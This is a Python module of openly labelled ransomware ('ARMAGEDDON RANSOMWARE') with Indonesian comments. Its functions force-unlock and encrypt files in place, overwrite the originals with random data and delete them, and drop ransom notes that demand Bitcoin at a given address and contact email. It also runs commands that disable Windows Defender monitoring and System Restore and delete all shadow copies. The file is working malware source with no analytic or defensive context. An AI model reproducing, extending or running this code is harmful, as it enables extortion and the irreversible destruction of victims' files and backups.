import os
import shutil
import tempfile
import platform
import ctypes
import sys
import time
import threading

class modify:
    @staticmethod
    def is_file_locked(filepath):
        """Cek apakah file sedang terkunci oleh proses lain"""
        if platform.system() == "Windows":
            try:
                os.rename(filepath, filepath)
                return False
            except:
                return True
        return False

    @staticmethod
    def force_unlock_file_windows(filepath):
        """Mencoba membuka kunci file di Windows"""
        try:
            if platform.system() == "Windows":
                # Gunakan atribut file untuk menghapus read-only
                ctypes.windll.kernel32.SetFileAttributesW(filepath, 128)  # FILE_ATTRIBUTE_NORMAL
                os.chmod(filepath, 0o777)
                return True
        except:
            pass
        return False

    @staticmethod
    def modify_file_inplace(filename, crypto_function):
        """Memodifikasi file dengan enkripsi - VERSI BRUTAL"""
        max_retries = 5
        retry_delay = 0.5
        
        for attempt in range(max_retries):
            try:
                # Cek dan force unlock jika perlu
                if modify.is_file_locked(filename):
                    modify.force_unlock_file_windows(filename)
                    time.sleep(retry_delay)
                
                # Backup permissions
                try:
                    stat_info = os.stat(filename)
                    permissions = stat_info.st_mode
                except:
                    permissions = None
                
                # Hapus atribut read-only
                try:
                    os.chmod(filename, 0o777)
                except:
                    pass
                
                # Baca file dalam mode binary
                try:
                    with open(filename, 'rb') as f:
                        data = f.read()
                except Exception as e:
                    if attempt < max_retries - 1:
                        time.sleep(retry_delay)
                        continue
                    else:
                        print(f"ERROR: Tidak bisa membaca {filename} setelah {max_retries} percobaan: {e}")
                        return False
                
                # Enkripsi data
                try:
                    encrypted_data = crypto_function(data)
                except Exception as e:
                    print(f"ERROR: Gagal mengenkripsi {filename}: {e}")
                    return False
                
                # Tulis file dengan data terenkripsi
                temp_file = None
                try:
                    # Gunakan file temporary untuk keamanan
                    fd, temp_file = tempfile.mkstemp(dir=os.path.dirname(filename))
                    os.close(fd)
                    
                    with open(temp_file, 'wb') as f:
                        f.write(encrypted_data)
                    
                    # Ganti file asli dengan file temporary
                    shutil.move(temp_file, filename)
                    
                    # Kembalikan permissions jika ada
                    if permissions:
                        try:
                            os.chmod(filename, permissions)
                        except:
                            pass
                    
                    print(f"[BRUTAL] BERHASIL enkripsi: {filename}")
                    return True
                    
                except Exception as e:
                    print(f"ERROR: Gagal menulis {filename}: {e}")
                    if temp_file and os.path.exists(temp_file):
                        try:
                            os.remove(temp_file)
                        except:
                            pass
                    return False
                    
            except Exception as e:
                if attempt < max_retries - 1:
                    print(f"[BRUTAL] Percobaan {attempt+1} gagal untuk {filename}, mengulang...")
                    time.sleep(retry_delay)
                else:
                    print(f"[BRUTAL] GAGAL TOTAL enkripsi {filename}: {e}")
                    return False
        
        return False

    @staticmethod
    def delete_original_files(file_list):
        """Menghapus file asli setelah backup (FITUR BRUTAL)"""
        for file in file_list:
            try:
                if os.path.exists(file):
                    # Overwrite dengan random data sebelum delete
                    with open(file, 'wb') as f:
                        f.write(os.urandom(1024))
                    os.remove(file)
                    print(f"[BRUTAL] Original file dihapus: {file}")
            except:
                pass

    @staticmethod
    def create_ransom_notes(directory):
        """Membuat file ransom note di setiap direktori"""
        note_content = """
         ARMAGEDDON RANSOMWARE 

SEMUA FILE ANDA TELAH DIENKRIPSI!

Tidak ada yang bisa menyelamatkan file Anda kecuali Anda membayar tebusan.

>> INSTRUKSI PEMBAYARAN:
1. Beli Bitcoin senilai 5 Juta Rupiah
2. Kirim ke alamat Bitcoin: bc1qvd00grpp3kea4nlgexvv7ktam62fv9lepfyt6w
3. Kirim bukti pembayaran ke email: retaabi58@gmail.com
4. Anda akan menerima kunci dekripsi dalam 24 jam

>> PERINGATAN:
- Jangan coba-coba mendekripsi sendiri, file akan RUSAK PERMANEN
- Jangan rename file, data akan HILANG
- Anda punya waktu 48 jam, setelah itu kunci akan dihapus

Selamat menikmati kegelapan...
"""
        
        try:
            note_path = os.path.join(directory, "ARMAGEDDON_README.txt")
            with open(note_path, 'w') as f:
                f.write(note_content)
        except:
            pass

    @staticmethod
    def disable_system_protections():
        """Menonaktifkan proteksi sistem (WINDOWS ONLY)"""
        if platform.system() == "Windows":
            try:
                # Matikan Windows Defender
                os.system('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"')
                os.system('powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"')
                
                # Matikan System Restore
                os.system('powershell -Command "Disable-ComputerRestore -Drive C:\\"')
                
                # Hapus shadow copies
                os.system('vssadmin delete shadows /all /quiet')
                
                print("[BRUTAL] System protections disabled!")
            except:
                pass
